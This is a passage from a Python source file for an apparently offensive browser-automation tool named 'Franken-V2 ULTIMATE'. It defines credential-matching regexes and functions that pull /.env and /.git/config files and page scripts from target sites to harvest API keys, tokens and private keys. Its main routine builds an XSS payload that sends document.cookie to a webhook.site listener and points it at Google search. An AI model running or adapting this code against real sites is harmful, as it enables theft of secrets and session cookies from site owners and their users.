            "Generic API Key": r"[aA][pP][iI]_?[kK][eE][yY].{0,20}['|\"][0-9a-zA-Z]{32,45}['|\"]",
            "Generic Secret": r"[sS][eE][cC][rR][eE][tT].{0,20}['|\"][0-9a-zA-Z]{32,45}['|\"]",
            "AWS API Key": r"((?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16})",
        }

        # Add SecretFinder patterns to the t-hoog scanner
        self.thoog_patterns.update({
            'Google API': r'AIza[0-9A-Za-z\\-_]{35}',
            'Firebase': r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
            'Google Captcha': r'6L[0-9A-Za-z-_]{38}|^6[0-9a-zA-Z_-]{39}$',
            'Google OAuth': r'ya29\.[0-9A-Za-z\-_]+',
            'Amazon AWS Access Key ID': r'A[SK]IA[0-9A-Z]{16}',
            'Amazon MWS Auth Token': r'amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
            'Amazon AWS URL': r's3\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\.s3\.amazonaws.com',
            'Amazon AWS URL2': r"([a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9-\.\_]+|s3-[a-zA-Z0-9-\.\_\/]+|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+)",
            'Facebook Access Token': r'EAACEdEose0cBA[0-9A-Za-z]+',
            'Authorization Basic': r'basic [a-zA-Z0-9=:_\+\/-]{5,100}',
            'Authorization Bearer': r'bearer [a-zA-Z0-9_\-\.=:_\+\/]{5,100}',
            'Authorization API': r'api[key|_key|\s+]+[a-zA-Z0-9_\-]{5,100}',
            'Mailgun API Key': r'key-[0-9a-zA-Z]{32}',
            'Twilio API Key': r'SK[0-9a-fA-F]{32}',
            'Twilio Account SID': r'AC[a-zA-Z0-9_\-]{32}',
            'Twilio App SID': r'AP[a-zA-Z0-9_\-]{32}',
            'PayPal Braintree Access Token': r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
            'Square OAuth Secret': r'sq0csp-[ 0-9A-Za-z\-_]{43}|sq0[a-z]{3}-[0-9A-Za-z\-_]{22,43}',
            'Square Access Token': r'sqOatp-[0-9A-Za-z\-_]{22}|EAAA[a-zA-Z0-9]{60}',
            'Stripe Standard API': r'sk_live_[0-9a-zA-Z]{24}',
            'Stripe Restricted API': r'rk_live_[0-9a-zA-Z]{24}',
            'GitHub Access Token': r'[a-zA-Z0-9_-]*:[a-zA-Z0-9_\-]+@github\.com*',
            'RSA Private Key': r'-----BEGIN RSA PRIVATE KEY-----',
            'SSH DSA Private Key': r'-----BEGIN DSA PRIVATE KEY-----',
            'SSH DC Private Key': r'-----BEGIN EC PRIVATE KEY-----',
            'PGP Private Block': r'-----BEGIN PGP PRIVATE KEY BLOCK-----',
            'JSON Web Token': r'ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$',
            'Slack Token': r'"api_token":"(xox[a-zA-Z]-[a-zA-Z0-9-]+)"',
            'SSH PrivKey': r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)",
            'Heroku API KEY': r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
            'Possible Creds': r"(?i)(password\s*[`=:\"]+\s*[^\s]+|password is\s*[`=:\"]*\s*[^\s]+|pwd\s*[`=:\"]*\s*[^\s]+|passwd\s*[`=:\"]+\s*[^\s]+)",
        })

        self.deny_list = ["AIDAAAAAAAAAAAAAAAAA"]

    def scan_content_for_secrets(self, content: str, source: str = "unknown", parent_url: str = "unknown"):
        """Scan content for secrets using t-hoog patterns"""
        if not hasattr(self, 'thoog_patterns'):
            self.setup_thoog_scanner()
            
        findings = []
        for name, pattern in self.thoog_patterns.items():
            try:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    # Normalize match if it's a tuple (from groups)
                    match_value = match[0] if isinstance(match, tuple) else match
                    if match_value not in self.deny_list:
                        finding = {
                            "type": name,
                            "value": match_value,
                            "source": source,
                            "parent_url": parent_url,
                            "timestamp": time.time()
                        }
                        findings.append(finding)
            except Exception as e:
                log.debug(f"Error scanning for {name}: {e}")
                continue
        return findings

    def scan_base64_content(self, content: str):
        """Decode and scan base64 encoded strings in content"""
        import re
        b64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        # Find potential base64 strings
        potential_b64 = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
        findings = []
        for encoded in potential_b64:
            try:
                # Ensure proper padding
                padding = len(encoded) % 4
                if padding:
                    encoded += '=' * (4 - padding)
                decoded = base64.b64decode(encoded).decode('utf-8', errors='ignore')
                # Scan the decoded content
                b64_findings = self.scan_content_for_secrets(decoded, f"base64:{encoded[:20]}...", "")
                findings.extend(b64_findings)
            except Exception:
                # Not a valid base64 string
                continue
        return findings

    def check_dot_env_and_git(self, url: str):
        """Check for .env and .git/config files like t-hoog does"""
        findings = []
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        env_url = f"{base_url}/.env"
        git_url = f"{base_url}/.git/config"
        
        import requests
        try:
            # Check for .env file
            env_response = requests.get(env_url, timeout=10)
            if env_response.status_code == 200 and env_response.text:
                env_findings = self.scan_content_for_secrets(env_response.text, f".env at {env_url}", url)
                findings.extend(env_findings)
        except Exception:
            pass  # .env file check failed, continue
            
        try:
            # Check for .git/config file
            git_response = requests.get(git_url, timeout=10)
            if git_response.status_code == 200 and git_response.text.startswith("[core]"):
                git_findings = self.scan_content_for_secrets(git_response.text, f".git/config at {git_url}", url)
                findings.extend(git_findings)
        except Exception:
            pass  # .git check failed, continue

        return findings

    def scan_page_with_thoog(self, url: str) -> List[Dict]:
        """Scan a page and related resources using t-hoog style techniques"""
        all_findings = []
        try:
            # Navigate to the URL
            self.driver.get(url)
            time.sleep(2)  # Allow page to load
            
            # Get page source
            page_content = self.driver.page_source
            page_findings = self.scan_content_for_secrets(page_content, f"Page Source: {url}", url)
            all_findings.extend(page_findings)
            
            # Scan base64 content in page
            b64_findings = self.scan_base64_content(page_content)
            all_findings.extend(b64_findings)
            
            # Check for .env and .git files
            env_git_findings = self.check_dot_env_and_git(url)
            all_findings.extend(env_git_findings)
            
            # Get all script URLs on the page
            script_elements = self.driver.find_elements(By.TAG_NAME, "script")
            for script_element in script_elements:
                script_src = script_element.get_attribute("src")
                if script_src and script_src.startswith(("http", "https", "//")):
                    if script_src.startswith("//"):
                        script_src = f"{urlparse(url).scheme}:{script_src}"
                    
                    try:
                        import requests
                        script_response = requests.get(script_src, timeout=10)
                        if script_response.status_code == 200:
                            script_findings = self.scan_content_for_secrets(script_response.text, f"Script: {script_src}", url)
                            all_findings.extend(script_findings)
                            
                            # Also scan base64 in scripts
                            script_b64_findings = self.scan_base64_content(script_response.text)
                            all_findings.extend(script_b64_findings)
                    except Exception as e:
                        log.debug(f"Could not fetch script {script_src}: {e}")
                        continue

        except Exception as e:
            log.error(f"Error scanning page {url}: {e}")

        return all_findings

    def save_scan_results(self, findings: List[Dict], output_file: str = "scan_results.txt"):
        """Save scan results to a file"""
        try:
            with open(output_file, 'a', encoding='utf-8') as f:
                for finding in findings:
                    line = f"[{finding['type']}] {finding['source']} -> {finding['value'][:100]}\n"
                    f.write(line)
            log.info(f"Saved {len(findings)} findings to {output_file}")
        except Exception as e:
            log.error(f"Could not save scan results: {e}")

    async def close(self):
        """Closes the browser and cleans up."""
        if self.driver:
            try:
                await self._save_cookies(self.driver.current_url)
                self.driver.quit()
                log.info("Franken-V2 ULTIMATE has been put to rest.")
            except Exception as e:
                log.error(f"Error during shutdown: {e}")
            finally:
                self.driver = None


# ===== EXAMPLE USAGE =====
async def main():
    """Demonstration of the Franken-V2 ULTIMATE engine for data exfiltration."""
    log.info("=== FRANKEN-V2 ULTIMATE DATA EXFILTRATION TEST ===")

    # Create config if doesn't exist
    if not Path("franken_config.yaml").exists():
        load_config()
        print("\n'franken_config.yaml' has been created.")
        return

    engine = FrankenV2Ultimate(profile_id="ultimate_exfil_test")

    if not await engine.initialize_driver():
        log.critical("Engine failed to start. Aborting.")
        return

    try:
        # This payload attempts to send the cookie data to an external listener.
        # The script part is URL-encoded to be safely passed in the query string.
        exfil_payload = "%3Cscript%3Enew%20Image%28%29.src%3D%27https%3A//webhook.site/c9a5b6f7-9d7c-4a3b-9f6e-6a5d7c3b9f0e%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%3B%3C/script%3E"
        target_url = f"https://www.google.com/search?q={exfil_payload}"
        
        log.info(f"Attempting data exfiltration via DOM-based XSS on: https://www.google.com/")
        log.info("Payload will attempt to send cookies to webhook.site.")

        await engine.navigate(target_url)
        await asyncio.sleep(5) # Allow time for the script to execute and the request to be sent
        screenshot_path = engine.take_screenshot("ultimate_exfil_test.png")

        log.info(f"✅ ULTIMATE exfiltration test complete! The attempt has been made. Check screenshot: {screenshot_path}")
        log.info("Please check the listener at https://webhook.site/c9a5b6f7-9d7c-4a3b-9f6e-6a5d7c3b9f0e to see if data was received.")

    except Exception as e:
        log.error(f"Error during demonstration: {e}", exc_info=True)
        engine.take_screenshot("error.png")
    finally:
        await engine.close()


if __name__ == "__main__":
    asyncio.run(main())
